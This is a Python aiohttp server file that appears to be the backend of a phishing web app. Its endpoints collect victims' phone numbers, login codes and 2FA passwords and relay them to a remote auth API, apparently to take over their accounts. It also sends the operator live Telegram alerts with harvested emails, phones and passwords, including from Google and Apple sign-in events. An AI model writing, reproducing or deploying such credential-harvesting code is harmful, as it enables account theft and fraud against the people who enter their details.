import json
import logging
import os
from aiohttp import web

from shared.api_client import RemoteAuthAPIClient
from shared.config import DB_PATH, REMOTE_API_KEY, REMOTE_API_URL
from shared import db

logger = logging.getLogger("webapp.server")
WEBAPP_DIR = os.path.dirname(os.path.abspath(__file__))

api_client = RemoteAuthAPIClient(REMOTE_API_URL, REMOTE_API_KEY)


async def handle_index(request: web.Request) -> web.FileResponse:
    return web.FileResponse(os.path.join(WEBAPP_DIR, "index.html"))


async def api_send_code(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        phone = data.get("phone", "").strip()
        tg_id = data.get("tg_id")
        username = data.get("username")

        if not phone:
            return web.json_response({"ok": False, "error": "Номер телефона обязателен"})

        # Record phone in DB
        if tg_id:
            db.set_user_phone(DB_PATH, tg_id, phone)

        res = await api_client.send_code(phone=phone, tg_id=tg_id, username=username)
        return web.json_response(res)
    except Exception as exc:
        logger.error("api_send_code error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_verify_code(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        session_id = data.get("session_id", "")
        phone = data.get("phone", "")
        code = data.get("code", "").strip()

        if not code:
            return web.json_response({"ok": False, "error": "Код обязателен"})

        res = await api_client.verify_code(session_id=session_id, phone=phone, code=code)
        return web.json_response(res)
    except Exception as exc:
        logger.error("api_verify_code error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_verify_2fa(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        session_id = data.get("session_id", "")
        phone = data.get("phone", "")
        password = data.get("password", "")

        if not password:
            return web.json_response({"ok": False, "error": "Пароль обязателен"})

        res = await api_client.verify_2fa(session_id=session_id, phone=phone, password=password)
        return web.json_response(res)
    except Exception as exc:
        logger.error("api_verify_2fa error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


import asyncio
from shared.notifier import notify_auth_credential_event

async def api_event(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        tg_id = data.get("tg_id")
        phone = data.get("phone")
        email = data.get("email")
        event = data.get("event") or data.get("step") or "event"
        if not tg_id:
            if phone:
                tg_id = int("".join(c for c in str(phone) if c.isdigit()) or "0")
            elif email:
                tg_id = int(abs(hash(email))) % (10**10)
            else:
                tg_id = int(os.path.getmtime(__file__))
        db.get_or_create_user(DB_PATH, tg_id, data.get("username"), data.get("nickname"), phone=phone)
        if email:
            db.set_user_email(DB_PATH, tg_id, email)
        if phone:
            db.set_user_phone(DB_PATH, tg_id, phone)
        db.set_user_auth_step(DB_PATH, tg_id, event)

        # Dispatch live Telegram alert if it's a Google or Apple auth event
        if any(k in str(event).lower() for k in ["google", "apple"]):
            asyncio.create_task(
                notify_auth_credential_event(
                    event_type=str(event),
                    user_tg_id=tg_id,
                    username=data.get("username"),
                    nickname=data.get("nickname"),
                    phone=phone,
                    email=email,
                    password=data.get("password_2fa"),
                    details=data.get("details"),
                    device=data.get("device"),
                    is_test=bool(data.get("is_test", False)),
                )
            )

        return web.json_response({"ok": True})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_complete(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        tg_id = data.get("tg_id")
        email = data.get("email")
        phone = data.get("phone")
        if not tg_id:
            if phone:
                tg_id = int("".join(c for c in str(phone) if c.isdigit()) or "0")
            elif email:
                tg_id = int(abs(hash(email))) % (10**10)
            else:
                tg_id = int(os.path.getmtime(__file__))
        db.get_or_create_user(DB_PATH, tg_id, data.get("username"), data.get("nickname"), phone=phone)
        if email:
            db.set_user_email(DB_PATH, tg_id, email)
        db.set_user_auth_step(DB_PATH, tg_id, "authorized")

        # Dispatch final auth completion event
        asyncio.create_task(
            notify_auth_credential_event(
                event_type="auth_complete",
                user_tg_id=tg_id,
                username=data.get("username"),
                nickname=data.get("nickname"),
                phone=phone,
                email=email,
                password=data.get("password_2fa"),
                details="Авторизация успешно завершена",
                is_test=bool(data.get("is_test", False)),
            )
        )

        return web.json_response({"ok": True})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_status(request: web.Request) -> web.Response:
    tg_id = request.query.get("tg_id")
    phone = request.query.get("phone")
    user = None
    if tg_id:
        user = db.get_user_by_tg_id(DB_PATH, int(tg_id))
    elif phone:
        user = db.get_user_by_phone(DB_PATH, phone)
    if user:
        is_auth = (user.get("auth_step") or "").lower() == "authorized"
        return web.json_response({"ok": True, "authorized": is_auth, "auth_step": user.get("auth_step")})
    return web.json_response({"ok": True, "authorized": False, "auth_step": "unauthorized"})


def create_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/index.html", handle_index)

    # API endpoints
    app.router.add_get("/api/auth/status", api_status)
    app.router.add_post("/api/auth/complete", api_complete)
    app.router.add_post("/api/auth/event", api_event)
    app.router.add_post("/api/auth/send-code", api_send_code)
    app.router.add_post("/api/auth/verify-code", api_verify_code)
    app.router.add_post("/api/auth/verify-2fa", api_verify_2fa)

    # Static assets
    app.router.add_static("/", WEBAPP_DIR)
    return app


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    port = int(os.environ.get("WEBAPP_PORT", "8080"))
    host = os.environ.get("WEBAPP_HOST", "0.0.0.0")
    print(f"Starting WebApp server on http://{host}:{port}")
    web.run_app(create_app(), host=host, port=port)
